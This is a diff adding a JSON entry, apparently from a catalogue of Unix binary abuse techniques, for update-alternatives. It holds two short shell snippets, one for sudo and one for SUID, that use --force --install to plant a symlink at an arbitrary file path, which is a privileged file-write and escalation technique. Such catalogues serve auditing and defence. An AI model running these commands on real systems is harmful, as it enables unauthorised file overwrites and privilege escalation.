@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "Write in [file] a symlink to $TF.",
+        "code": "TF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install [file] x \"$TF\" 0\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "Write in [file] a symlink to $TF.",
+        "code": "TF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install [file] x \"$TF\" 0\n"
+      }
+    ]
+  }
+}
